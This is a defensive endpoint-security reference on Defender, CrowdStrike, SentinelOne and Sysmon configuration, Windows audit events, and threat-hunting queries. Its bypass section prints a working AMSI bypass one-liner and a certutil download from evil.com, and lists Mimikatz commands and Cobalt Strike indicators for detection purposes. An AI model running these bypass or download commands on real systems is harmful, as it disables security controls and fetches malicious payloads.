# Endpoint Security Reference

A comprehensive reference covering EDR platforms, AV/next-gen AV, Windows Defender
configuration, Sysmon deployment, and endpoint threat hunting. Aligned with MITRE
ATT&CK and real-world blue-team operations.

---

## 1. Endpoint Security Architecture

### Defense Layers
```
User Endpoint
│
├── AV / NGAV          ← Prevention: signature + ML
├── EDR                ← Detect + Investigate + Respond
├── Host Firewall      ← Network-level control
├── SIEM / SOAR        ← Centralized detection + automation
└── Zero Trust NAC     ← Conditional access enforcement
```

### EPP vs EDR vs XDR vs MDR

| Category | Function | Examples |
|----------|----------|---------|
| AV/EPP | Signature + heuristic malware prevention | Windows Defender AV, Malwarebytes |
| NGAV | ML-based prevention, no signatures needed | Cylance, SentinelOne prevent mode |
| EDR | Detect + investigate + respond | CrowdStrike Falcon, SentinelOne, Carbon Black |
| XDR | EDR + network + cloud + email telemetry | Palo Alto Cortex XDR, Microsoft 365 Defender |
| MDR | Managed detection & response service | CrowdStrike Falcon Complete, SentinelOne Vigilance |

**Key selection criteria:**
- Telemetry richness (process tree, file, network, registry)
- Query language capability for threat hunting
- Automated response actions (contain, kill, rollback)
- MITRE ATT&CK coverage (see MITRE Evaluations)
- Integration with SIEM/SOAR pipeline

---

## 2. Microsoft Defender for Endpoint (MDE)

### Deployment Methods
- **Intune** (cloud-managed): Device Configuration profiles, MDE connector
- **SCCM/MEM**: Onboarding package deployed via software distribution
- **Group Policy**: `WindowsDefenderATP.admx` template
- **Local script**: `WindowsDefenderATPOnboardingScript.cmd`
- **VDI**: Non-persistent onboarding package

### Attack Surface Reduction (ASR) Rules — All 19

| Rule Name | GUID | Recommended Mode |
|-----------|------|-----------------|
| Block abuse of exploited vulnerable signed drivers | 56a863a9-875e-4185-98a7-b882c64b5ce5 | Block |
| Block Adobe Reader from creating child processes | 7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c | Block |
| Block all Office applications from creating child processes | d4f940ab-401b-4efc-aadc-ad5f3c50688a | Block |
| Block credential stealing from Windows LSA | 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0 | Block |
| Block executable content from email client | be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 | Block |
| Block executable files unless they meet prevalence criteria | 01443614-cd74-433a-b99e-2ecdc07bfc25 | Audit first |
| Block execution of potentially obfuscated scripts | 5beb7efe-fd9a-4556-801d-275e5ffc04cc | Block |
| Block JavaScript or VBScript from launching downloaded content | d3e037e1-3eb8-44c8-a917-57927947596d | Block |
| Block Office apps from creating executable content | 3b576869-a4ec-4529-8536-b80a7769e899 | Block |
| Block Office apps from injecting code into processes | 75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84 | Block |
| Block Office communication apps from creating child processes | 26190899-1602-49e8-8b27-eb1d0a1ce869 | Block |
| Block persistence through WMI event subscription | e6db77e5-3df2-4cf1-b95a-636979351e5b | Block |
| Block process creations from PSExec and WMI commands | d1e49aac-8f56-4280-b9ba-993a6d77406c | Audit (breaks admin tools) |
| Block rebooting machine in safe mode | 33ddedf1-c6e0-47cb-833e-de6133960387 | Block |
| Block untrusted and unsigned processes from USB | b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4 | Block |
| Block use of copied or impersonated system tools | c0033c00-d16d-4114-a5a0-dc9b3a7d2ceb | Block |
| Block Webshell creation for servers | a8f5898e-1dc8-49a9-9878-85004b8a61e6 | Block (servers) |
| Block Win32 API calls from Office macros | 92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b | Block |
| Use advanced protection against ransomware | c1db55ab-c21a-4637-bb3f-a12568109d35 | Block |

**Deployment strategy:** Start all rules in **Audit** mode, monitor for false positives for 2-4 weeks, then promote to **Block** one rule at a time.

### Tamper Protection

Always enable — prevents disabling Defender via registry, PowerShell, or local policy.

```powershell
# Enable Tamper Protection via PowerShell (requires admin)
Set-MpPreference -DisableTamperProtection $false

# Verify status
Get-MpComputerStatus | Select TamperProtectionSource
```

In Intune: Endpoint Security → Antivirus → Windows Security experience → Tamper Protection = On

### Cloud Protection (MAPS) and Sample Submission

```powershell
# Advanced cloud protection (highest accuracy)
Set-MpPreference -MAPSReporting Advanced

# Auto-submit samples for unknown detections
Set-MpPreference -SubmitSamplesConsent SendAllSamples

# High cloud block level (blocks more aggressively)
Set-MpPreference -CloudBlockLevel High

# Wait up to 50 seconds for cloud verdict before allowing execution
Set-MpPreference -CloudExtendedTimeout 50
```

### PUA (Potentially Unwanted Application) Blocking

```powershell
Set-MpPreference -PUAProtection Enabled
```

### Network Protection

Blocks connections to C2 domains, malicious IPs, phishing sites at the kernel level.

```powershell
# Enable Network Protection (requires Audit mode testing first)
Set-MpPreference -EnableNetworkProtection Enabled

# Audit mode for testing
Set-MpPreference -EnableNetworkProtection AuditMode
```

### Controlled Folder Access (Anti-Ransomware)

Prevents unauthorized processes from writing to protected folders.

```powershell
# Enable
Set-MpPreference -EnableControlledFolderAccess Enabled

# Add a custom protected folder
Add-MpPreference -ControlledFolderAccessProtectedFolders "C:\SensitiveData"

# Allow a legitimate app to write to protected folders
Add-MpPreference -ControlledFolderAccessAllowedApplications "C:\MyApp\app.exe"

# View current config
Get-MpPreference | Select EnableControlledFolderAccess, ControlledFolderAccessProtectedFolders
```

### Exclusions (Use Sparingly)

Every exclusion is a detection gap. Document all exclusions with business justification.

```powershell
# View all current exclusions
Get-MpPreference | Select ExclusionPath, ExclusionProcess, ExclusionExtension

# Add path exclusion
Add-MpPreference -ExclusionPath "C:\Verified\LegacyApp"

# Add process exclusion
Add-MpPreference -ExclusionProcess "C:\Verified\legitimate.exe"

# Add extension exclusion (least preferred)
Add-MpPreference -ExclusionExtension ".log"

# Remove a specific exclusion
Remove-MpPreference -ExclusionPath "C:\Verified\LegacyApp"
```

---

## 3. CrowdStrike Falcon

### Prevention Policy Settings

| Category | Setting | Recommended |
|----------|---------|-------------|
| Sensor Anti-Malware | On-write detection | Aggressive |
| Sensor Anti-Malware | On-execution detection | Aggressive |
| Sensor Anti-Malware | Adware & PUA | Enabled |
| ML (Cloud AI) | Cloud anti-malware | Extra Aggressive |
| Exploit Detection | Heap spray | Enabled |
| Exploit Detection | SEH chain overwrite | Enabled |
| Exploit Detection | Return address overwrite | Enabled |
| Exploit Detection | ROP (gadgets) | Enabled |
| Execution Blocking | Suspicious processes | Enabled |
| Execution Blocking | Intelligence-sourced IoAs | Enabled |
| Ransomware | File encryption monitoring | Enabled |
| Script Control | Script-based execution monitoring | Enabled |
| Script Control | AMSI integration | Enabled |

### Real-Time Response (RTR) Commands

```bash
# Basic investigation commands
runscript -Raw=```hostname; whoami; ipconfig /all```
runscript -Raw=```Get-Process | Sort-Object CPU -Descending | Select -First 10```
ls C:\Users\
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# File system investigation
ls C:\Windows\Temp\
ls C:\Users\Public\

# Retrieve a suspicious file (brings it to the Falcon console)
get C:\Windows\Temp\suspicious.exe

# Kill a process by PID
kill 1234

# Network connections (PowerShell)
runscript -Raw=```netstat -ano | Select-String ESTABLISHED```

# Check persistence
runscript -Raw=```schtasks /query /fo LIST /v | findstr /i "task name\|status\|run as"```

# Containment: Host Management → Contain (preserves RTR access)
# Lift containment: Host Management → Lift Containment
```

### Falcon Fusion (SOAR) Workflow Examples

- Detection severity >= High → Auto-contain host → Notify IR team via PagerDuty
- New IoA (Indicator of Attack) detection → Enrich with threat intel → Create ServiceNow ticket
- USB device insertion → Log + alert if outside approved device list
- New admin account created → Alert + disable pending review

### Custom IOA (Indicator of Attack) Rules

Custom IOAs detect behaviors not covered by default detections. Example patterns:

| Process | Command Contains | Action |
|---------|-----------------|--------|
| `winword.exe` | Spawns `cmd.exe /c whoami` | Detect/Prevent |
| `excel.exe` | Spawns `powershell.exe -enc` | Detect/Prevent |
| `mshta.exe` | Any child process | Detect/Prevent |
| `wscript.exe` | Any child process spawning net.exe | Detect/Prevent |

---

## 4. SentinelOne

### Agent Modes
| Mode | Description |
|------|-------------|
| Detect | Monitor and alert, no blocking |
| Protect | Full prevention and remediation |
| Interoperability | Coexistence mode for legacy AV compatibility |

### Protection Policies

- **Static AI**: Pre-execution ML model assessment — catches known malware families
- **Behavioral AI**: Runtime behavior monitoring — catches novel/custom malware
- **Anti-Exploitation**: KASLR enforcement, heap spray protection, SEH overwrite detection
- **Ransomware Protection**: Honeypot files, shadow copy protection, automatic rollback

### Storyline™ Technology

All events (process, file, network, registry) are automatically linked to the originating
process tree. This eliminates manual correlation in the console — an alert includes full
context without additional investigation.

### Deep Visibility Queries (S1QL)

```sql
-- Find processes connecting to known bad IPs
SELECT * FROM events
WHERE EventType = 'IP Connect'
AND DstIp IN ('1.2.3.4', '5.6.7.8')

-- Find PowerShell with encoded commands
SELECT * FROM events
WHERE EventType = 'Process Creation'
AND ProcessName = 'powershell.exe'
AND CmdLine CONTAINS '-enc'

-- Find persistence via scheduled tasks
SELECT * FROM events
WHERE EventType = 'Scheduled Task Create'

-- Find LSASS access attempts
SELECT * FROM events
WHERE EventType = 'Open Remote Process Handle'
AND TargetProcessName = 'lsass.exe'

-- Find lateral movement via SMB
SELECT * FROM events
WHERE EventType = 'IP Connect'
AND DstPort = 445
AND NOT SrcIp = DstIp

-- Find DLL side-loading (DLL in non-standard path)
SELECT * FROM events
WHERE EventType = 'Module Load'
AND NOT FilePath CONTAINS 'C:\Windows'
AND NOT FilePath CONTAINS 'C:\Program Files'
```

### Automatic Remediation

When ransomware behavior is detected (mass file encryption):
1. Process is killed immediately
2. Files restored from VSS snapshots (rollback)
3. Host quarantined from network
4. Incident created in console

---

## 5. Sysmon — Windows System Monitor

### Deployment

```cmd
rem Install with config
sysmon64.exe -accepteula -i sysmon-config.xml

rem Update existing config
sysmon64.exe -c sysmon-config.xml

rem Check current config
sysmon64.exe -c

rem Uninstall
sysmon64.exe -u

rem Uninstall (force, driver removed immediately)
sysmon64.exe -u force
```

### Recommended Configurations

- **SwiftOnSecurity**: `github.com/SwiftOnSecurity/sysmon-config` — well-tuned baseline
- **Olaf Hartong modular**: `github.com/olafhartong/sysmon-modular` — modular, tag-based
- **Neo23x0**: `github.com/Neo23x0/sysmon-config` — threat-hunting focused

### Sysmon Event IDs Reference

| Event ID | Event Type | Detection Value |
|----------|-----------|-----------------|
| 1 | Process Creation | Full command line, parent process, hashes |
| 2 | File Creation Time Changed | Timestomping detection |
| 3 | Network Connection | Outbound connections with process context |
| 4 | Sysmon Service State Changed | Sysmon stop/start events |
| 5 | Process Terminated | Process execution duration |
| 6 | Driver Loaded | Kernel driver loads, signature status |
| 7 | Image Loaded | DLL loads with signature status |
| 8 | CreateRemoteThread | Process injection indicator |
| 9 | RawAccessRead | Disk access bypassing filesystem (MBR access) |
| 10 | ProcessAccess | LSASS memory access (credential theft) |
| 11 | FileCreate | File creation events |
| 12 | RegistryEvent (Object Create/Delete) | Registry persistence |
| 13 | RegistryEvent (Value Set) | Registry value modification |
| 14 | RegistryEvent (Key/Value Rename) | Registry key rename |
| 15 | FileCreateStreamHash | Alternate data stream creation |
| 16 | ServiceConfigurationChange | Service modification |
| 17 | PipeEvent (Pipe Created) | Named pipe creation (Cobalt Strike C2) |
| 18 | PipeEvent (Pipe Connected) | Named pipe connection |
| 19 | WmiEvent (WmiEventFilter) | WMI persistence filter |
| 20 | WmiEvent (WmiEventConsumer) | WMI persistence consumer |
| 21 | WmiEvent (WmiEventConsumerToFilter) | WMI binding |
| 22 | DNSEvent | DNS queries with process context |
| 23 | FileDelete | File deletion (malware cleanup) |
| 24 | ClipboardChange | Clipboard content capture |
| 25 | ProcessTampering | Process image tampering (hollowing) |
| 26 | FileDeleteDetected | File deletion detected (no content) |
| 27 | FileBlockExecutable | Executable file blocked |
| 28 | FileBlockShredding | File shredding blocked |

### Sample sysmon-config.xml Snippets

```xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
  <CheckRevocation/>

  <EventFiltering>

    <!-- Process Creation: exclude noisy but benign processes -->
    <RuleGroup name="" groupRelation="or">
      <ProcessCreate onmatch="exclude">
        <Image condition="is">C:\Windows\System32\conhost.exe</Image>
        <Image condition="is">C:\Windows\System32\wermgr.exe</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- LSASS access detection (credential theft) -->
    <RuleGroup name="LSASS Access" groupRelation="or">
      <ProcessAccess onmatch="include">
        <TargetImage condition="is">C:\Windows\system32\lsass.exe</TargetImage>
      </ProcessAccess>
    </RuleGroup>

    <!-- Network: exclude known-good high-volume processes -->
    <RuleGroup name="" groupRelation="or">
      <NetworkConnect onmatch="exclude">
        <Image condition="is">C:\Windows\System32\svchost.exe</Image>
        <Image condition="is">C:\Windows\System32\SearchIndexer.exe</Image>
      </NetworkConnect>
    </RuleGroup>

    <!-- Driver loads: log everything (important for rootkit detection) -->
    <RuleGroup name="" groupRelation="or">
      <DriverLoad onmatch="exclude">
        <!-- No exclusions recommended -->
      </DriverLoad>
    </RuleGroup>

    <!-- Named pipe detection (Cobalt Strike default pipes) -->
    <RuleGroup name="Suspicious Pipes" groupRelation="or">
      <PipeEvent onmatch="include">
        <PipeName condition="contains">\msagent_</PipeName>
        <PipeName condition="contains">\postex_</PipeName>
        <PipeName condition="contains">\mojo.</PipeName>
      </PipeEvent>
    </RuleGroup>

    <!-- Registry persistence locations -->
    <RuleGroup name="Registry Persistence" groupRelation="or">
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains">\CurrentVersion\Run</TargetObject>
        <TargetObject condition="contains">\CurrentVersion\RunOnce</TargetObject>
        <TargetObject condition="contains">\Winlogon</TargetObject>
      </RegistryEvent>
    </RuleGroup>

  </EventFiltering>
</Sysmon>
```

---

## 6. Windows Event Log — Security Monitoring

### Critical Security Event IDs

| Event ID | Description | Alert Condition |
|----------|-------------|-----------------|
| 4624 | Successful logon | Type 10 (RemoteInteractive/RDP) from unusual source |
| 4625 | Failed logon | >10 in 5 min from single source (brute force) |
| 4634/4647 | Logoff | Correlate with 4624 for session duration |
| 4648 | Logon with explicit credentials | RunAs, Pass-the-Hash indicators |
| 4656 | Object handle requested | Sensitive file access |
| 4663 | Object access attempted | File/registry access with process context |
| 4672 | Special privileges assigned | Admin token assigned on logon |
| 4688 | Process created (with command line) | Requires "Audit Process Creation" + command line auditing |
| 4697 | Service installed | New service creation (T1543.003) |
| 4698 | Scheduled task created | Persistence (T1053.005) |
| 4699 | Scheduled task deleted | Cleanup after use |
| 4702 | Scheduled task modified | Modified persistence |
| 4704 | User right assigned | Privilege escalation |
| 4719 | System audit policy changed | Disable logging attempt |
| 4720 | User account created | New account (T1136) |
| 4722 | User account enabled | Enable dormant/backdoor account |
| 4723 | Password change attempt | Credential access |
| 4724 | Password reset attempt | Admin credential tampering |
| 4726 | User account deleted | Cleanup activity |
| 4728 | Member added to security group | Global group privilege escalation |
| 4732 | Member added to local group | Local admin group change |
| 4756 | Member added to universal group | Domain privilege escalation |
| 4768 | Kerberos TGT requested | AS-REP roast if PreAuth type 0 |
| 4769 | Kerberos TGS requested | Kerberoasting if RC4 + high volume |
| 4771 | Kerberos preauthentication failed | Brute force / password spray |
| 4776 | NTLM authentication | Pass-the-hash indicators |
| 4798 | User's local group membership enumerated | BloodHound/enumeration |
| 4799 | Security-enabled local group enumerated | BloodHound/enumeration |
| 4946 | Windows Firewall rule added | T1562.004 (firewall bypass) |
| 5140 | Network share accessed | Lateral movement / data exfil |
| 5145 | Network share object checked | File-level share access |
| 7034 | Service crashed unexpectedly | Potential exploit attempt |
| 7045 | Service installed (System log) | Persistence detection |

### Enable Command Line Auditing (Event 4688)

```powershell
# Required for process command line in Event 4688
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1
```

### Advanced Audit Policy Configuration

```powershell
# Enable all recommended subcategories
# Account Logon
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

# Account Management
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Security Group Management" /success:enable /failure:enable
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable

# Detailed Tracking
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Process Termination" /success:enable

# Logon/Logoff
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Logoff" /success:enable
auditpol /set /subcategory:"Special Logon" /success:enable

# Object Access
auditpol /set /subcategory:"File System" /success:enable /failure:enable
auditpol /set /subcategory:"Registry" /success:enable /failure:enable
auditpol /set /subcategory:"SAM" /success:enable /failure:enable

# Policy Change
auditpol /set /subcategory:"Audit Policy Change" /success:enable /failure:enable
auditpol /set /subcategory:"Authorization Policy Change" /success:enable

# Privilege Use
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable

# System
auditpol /set /subcategory:"Security State Change" /success:enable /failure:enable
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable

# Verify
auditpol /get /category:*
```

### Increase Event Log Size

```powershell
# Set Security log to 512MB
wevtutil sl Security /ms:536870912

# Set System log to 256MB
wevtutil sl System /ms:268435456

# Set Application log to 256MB
wevtutil sl Application /ms:268435456

# Check current sizes
wevtutil gl Security | findstr maxSize
```

---

## 7. Endpoint Detection: Hunting Queries

### Windows Event Log (PowerShell)

```powershell
# Scheduled tasks created in last 7 days
Get-WinEvent -LogName Security -FilterXPath `
  "*[System[EventID=4698] and System[TimeCreated[timediff(@SystemTime) <= 604800000]]]"

# RDP logons in last 24 hours
Get-WinEvent -LogName Security -FilterXPath `
  "*[System[EventID=4624] and EventData[Data[@Name='LogonType']='10'] and System[TimeCreated[timediff(@SystemTime) <= 86400000]]]"

# New services installed
Get-WinEvent -LogName System -FilterXPath "*[System[EventID=7045]]" |
  Select-Object TimeCreated, @{n='Message';e={$_.Message}}

# Failed logins (brute force) in last hour
$Events = Get-WinEvent -LogName Security -FilterXPath `
  "*[System[EventID=4625] and System[TimeCreated[timediff(@SystemTime) <= 3600000]]]"
$Events | Group-Object {$_.Properties[19].Value} | Sort Count -Desc | Select -First 20

# Pass-the-hash indicators (4648 logon with explicit creds)
Get-WinEvent -LogName Security -FilterXPath `
  "*[System[EventID=4648]]" | Where-Object {$_.Message -notlike "*SYSTEM*"}

# New local admin accounts
Get-WinEvent -LogName Security | Where-Object {
  $_.Id -in 4720,4732 -and
  $_.TimeCreated -gt (Get-Date).AddDays(-7)
}
```

### KQL Queries for Microsoft Sentinel / MDE

```kql
// Suspicious PowerShell encoded commands
DeviceProcessEvents
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-enc"
    or ProcessCommandLine contains "-EncodedCommand"
    or ProcessCommandLine contains "-e " // short form
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp desc

// LSASS access (credential theft - Mimikatz/etc.)
DeviceEvents
| where ActionType == "LsassProcessInjection"
    or ActionType == "OpenProcessApiCall" and AdditionalFields contains "lsass"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine

// DNS to high-entropy / DGA-like domains
DeviceNetworkEvents
| where RemotePort == 53
| extend DomainLength = strlen(RemoteUrl)
| where DomainLength > 30
    and RemoteUrl !contains "microsoft"
    and RemoteUrl !contains "google"
    and RemoteUrl !contains "windows"
    and RemoteUrl !contains "azure"
| summarize Count=count() by DeviceName, RemoteUrl
| where Count > 5
| sort by Count desc

// Lateral movement via PsExec
DeviceProcessEvents
| where FileName in~ ("psexec.exe", "psexec64.exe", "PSEXESVC.exe")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// New local admin account creation
DeviceEvents
| where ActionType == "UserAccountCreated"
| project Timestamp, DeviceName, AccountName, InitiatingProcessAccountName
| join kind=leftouter (
    DeviceEvents
    | where ActionType == "UserAccountAddedToLocalGroup"
    | where AdditionalFields contains "administrators"
    | project AccountName, GroupAddTime=Timestamp
) on AccountName

// Scheduled task creation (T1053.005)
DeviceEvents
| where ActionType == "ScheduledTaskCreated"
| project Timestamp, DeviceName, AccountName,
    TaskName = extractjson("$.TaskName", AdditionalFields),
    TaskContent = extractjson("$.TaskContent", AdditionalFields)

// Process injection detection
DeviceEvents
| where ActionType in (
    "CreateRemoteThreadApiCall",
    "WriteProcessMemoryApiCall",
    "QueueUserApcRemoteApiCall"
)
| where InitiatingProcessFileName != FileName
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ActionType

// Office macro spawning LOLBins
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
| where FileName in~ (
    "cmd.exe","powershell.exe","wscript.exe","cscript.exe",
    "mshta.exe","regsvr32.exe","rundll32.exe","certutil.exe",
    "bitsadmin.exe","wmic.exe","msiexec.exe"
)
| project Timestamp, DeviceName, AccountName,
    ParentProcess=InitiatingProcessFileName,
    ChildProcess=FileName, ProcessCommandLine

// Cobalt Strike named pipe detection (Sysmon Event 17/18)
SecurityEvent
| where EventID in (17, 18)
| extend PipeName = extract("PipeName: (.*)", 1, EventData)
| where PipeName matches regex @"\\(msagent_|postex_|mojo\.|wkssvc|ntsvcs|DserNamePipe)"
| project TimeGenerated, Computer, PipeName, EventData
```

### Splunk SPL Queries

```spl
// Suspicious PowerShell
index=windows EventCode=4688 Image="*powershell.exe*"
| search CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*"
| table _time, host, user, CommandLine

// Brute force detection
index=windows EventCode=4625
| stats count by src_ip, user
| where count > 20
| sort -count

// LOLBin execution from Office
index=windows EventCode=1
| search ParentImage IN ("*winword.exe","*excel.exe","*outlook.exe")
  Image IN ("*cmd.exe","*powershell.exe","*mshta.exe","*wscript.exe","*cscript.exe")
| table _time, host, user, ParentImage, Image, CommandLine

// LSASS access
index=windows EventCode=10
| search TargetImage="*lsass.exe"
| table _time, host, SourceImage, GrantedAccess
```

---

## 8. Endpoint Hardening Checklist

### Defender / AV Configuration
```
[ ] Enable Windows Defender AV with real-time protection
[ ] Enable cloud protection (MAPS) - Advanced level
[ ] Enable automatic sample submission
[ ] Set cloud block level to High
[ ] Enable PUA protection
[ ] Enable Tamper Protection
[ ] Enable Network Protection (test in Audit first)
[ ] Enable Controlled Folder Access (test in Audit first)
[ ] Configure all 19 ASR rules (Audit → Block workflow)
[ ] Set scan schedule: daily quick + weekly full
[ ] Review and minimize exclusions (document each with justification)
```

### Account Security
```
[ ] Rename default local admin account
[ ] Randomize local admin passwords via LAPS (Local Administrator Password Solution)
[ ] Disable Guest account
[ ] Enable UAC (Admin Approval Mode, Level 2 or higher)
[ ] Enable Credential Guard (Windows 10/11 Enterprise)
[ ] Enable Protected Users security group for admins
[ ] Implement tiered admin model (Tier 0/1/2)
```

### Network Hardening
```
[ ] Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false
[ ] Disable LLMNR via GPO: Computer Config → Admin Templates → DNS Client → Turn off multicast name resolution
[ ] Disable NBT-NS: Network adapter → WINS → Disable NetBIOS over TCP/IP
[ ] Disable IPv6 if not used (reduces attack surface)
[ ] Enable Windows Firewall on all profiles (Domain/Private/Public)
[ ] Restrict inbound RDP to jump server IPs only
[ ] Enable firewall logging for dropped packets
```

### Patching
```
[ ] Windows Update: auto-install security updates (defer feature updates by 30 days)
[ ] Third-party patching: Intune/SCCM/WSUS/Automox
[ ] Firmware/BIOS/UEFI updates: scheduled quarterly review
[ ] Driver updates: via Windows Update or OEM tooling
```

### Application Control
```
[ ] AppLocker or Windows Defender Application Control (WDAC) for high-value targets
[ ] WDAC policy in audit mode before enforcement
[ ] Block unsigned scripts (PowerShell execution policy + WDAC)
[ ] Enable PowerShell script block logging
[ ] Enable PowerShell module logging
[ ] Enable PowerShell transcription logging
```

PowerShell logging registry settings:
```powershell
# Script Block Logging
$psPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $psPath -Force
Set-ItemProperty -Path $psPath -Name EnableScriptBlockLogging -Value 1

# Module Logging
$mlPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
New-Item -Path $mlPath -Force
Set-ItemProperty -Path $mlPath -Name EnableModuleLogging -Value 1

# Transcription
$tcPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
New-Item -Path $tcPath -Force
Set-ItemProperty -Path $tcPath -Name EnableTranscripting -Value 1
Set-ItemProperty -Path $tcPath -Name OutputDirectory -Value "C:\PSTranscripts"
```

### Logging and Monitoring
```
[ ] Advanced audit policy fully configured (see Section 6)
[ ] Security log minimum 128MB (recommended 512MB)
[ ] Enable command-line auditing in Process Creation events
[ ] Sysmon deployed with tuned config (SwiftOnSecurity or equivalent)
[ ] Log forwarding to SIEM configured (Winlogbeat / AMA / Event Forwarding)
[ ] WEF (Windows Event Forwarding) subscriptions active if no agent
[ ] Retention: minimum 90 days online, 1 year cold storage
```

---

## 9. Endpoint Detection Bypass Techniques (Know Your Enemy)

Defenders must understand common bypass techniques to build effective detections.

### AMSI Bypass

**Technique:** Patch `amsiInitFailed` in-memory to make AMSI report initialization failure.

```powershell
# Classic bypass (commonly detected now, but concept remains)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Detection improvements:**
- Monitor for memory writes to AMSI process space
- Alert on PowerShell processes that crash or report AMSI errors
- Behavioral alerts for `amsiInitFailed` pattern in ScriptBlock logs (obfuscated variants)
- Use Defender's AMSI integration as a telemetry source, not just a block

### ETW (Event Tracing for Windows) Bypass

**Technique:** Patch `EtwEventWrite` in ntdll.dll to `ret` — disables ETW-based telemetry.

**Detection:** Memory integrity checks, Kernel Patch Protection (KPP), EDR driver-level hooks.

### Process Injection

**Techniques:**
- `CreateRemoteThread` + `VirtualAllocEx` → classic injection
- `QueueUserAPC` → APC injection
- `SetWindowsHookEx` → hook injection
- Reflective DLL injection → no disk writes
- Process hollowing → hollow legitimate process, inject shellcode

**Detection:**
- Sysmon Event 8 (CreateRemoteThread)
- Sysmon Event 10 (ProcessAccess with suspicious access masks)
- EDR memory scanning for shellcode patterns
- Anomalous parent-child process relationships

### Living off the Land Binaries (LOLBins)

Common signed Microsoft binaries abused for execution:

| Binary | Abuse Technique |
|--------|----------------|
| `certutil.exe` | Download: `certutil -urlcache -split -f http://evil.com/payload.exe` |
| `mshta.exe` | Execute VBScript/JScript from URL |
| `regsvr32.exe` | Execute DLL/COM objects (Squiblydoo) |
| `rundll32.exe` | Execute DLL exports directly |
| `wmic.exe` | Remote code execution, process creation |
| `bitsadmin.exe` | Download + execute via BITS jobs |
| `msiexec.exe` | Install remote MSI packages |
| `installutil.exe` | Bypass AppLocker via .NET |
| `cmstp.exe` | UAC bypass + code execution |
| `odbcconf.exe` | Execute DLLs via ODBC config |

**Detection:** Behavioral rules for unusual parent processes, network connections from signed binaries, command-line parameters inconsistent with legitimate use.

### Credential Theft Techniques

| Technique | Method | MITRE |
|-----------|--------|-------|
| LSASS dumping | Mimikatz sekurlsa::logonpasswords | T1003.001 |
| DCSync | Mimikatz lsadump::dcsync | T1003.006 |
| Kerberoasting | Request TGS for SPN, crack offline | T1558.003 |
| AS-REP Roasting | Request TGT without preauth, crack offline | T1558.004 |
| NTLM relay | Relay NTLM auth to target service | T1557.001 |
| Pass-the-Hash | Authenticate with NTLM hash directly | T1550.002 |
| Pass-the-Ticket | Use stolen Kerberos ticket | T1550.003 |
| Golden Ticket | Forge TGT with krbtgt hash | T1558.001 |

**Detection:**
- LSASS access: Sysmon Event 10, Windows Defender Credential Guard
- Kerberoasting: 4769 with RC4 encryption + high volume from single account
- DCSync: 4662 with replication rights from non-DC machine
- Pass-the-Hash: 4624 Type 3 with NTLM + mismatched workstation

### Cobalt Strike Indicators

Default indicators (operators should change these):

- Named pipes: `\.\pipe\msagent_*`, `\.\pipe\postex_*`
- HTTP malleable C2: default `jquery-c2.4.2.profile`
- Beacon sleep: BEACON_SLEEP default 60 seconds ± 30% jitter
- Default staging: `x86/x64 stager` with shellcode at `/api/` or `/news/`
- Certificate: self-signed with organization "cobaltstrike" (default)

---

## 10. EDR Tools & Resources

### Platform Comparison

| Platform | Key Strength | Query Language | License Model |
|----------|-------------|----------------|---------------|
| CrowdStrike Falcon | Market leader, RTR, OverWatch hunting | Falcon LogScale (Humio) | Per-endpoint SaaS |
| SentinelOne | Storyline, rollback, Deep Visibility | S1QL | Per-endpoint SaaS |
| Microsoft Defender for Endpoint | Native Windows, free with E5 | KQL (Sentinel/MDE) | M365 E5 / standalone |
| Carbon Black (VMware) | Process tree depth, binary reputation | CBC Query Language | Per-endpoint SaaS |
| Cortex XDR (Palo Alto) | Network + endpoint correlation | XQL | Per-endpoint SaaS |
| Elastic Security | Open source, SIEM+EDR, EQL | EQL / Lucene | Free OSS / paid |
| Velociraptor | Free, DFIR, live forensics | VQL | Free / open source |
| Wazuh | Free, SIEM+HIDS, FIM | Elasticsearch/Lucene | Free / open source |

### MITRE ATT&CK Resources

- **ATT&CK Navigator**: `attack.mitre.org/matrices/enterprise/`
- **MITRE Evaluations**: `attackevals.mitre-engenuity.org` — annual APT simulation testing of EDR products
- **Atomic Red Team**: `github.com/redcanaryco/atomic-red-team` — ATT&CK-mapped test cases
- **CALDERA**: `github.com/mitre/caldera` — automated adversary emulation
- **Sigma Rules**: `github.com/SigmaHQ/sigma` — generic SIEM detection rules

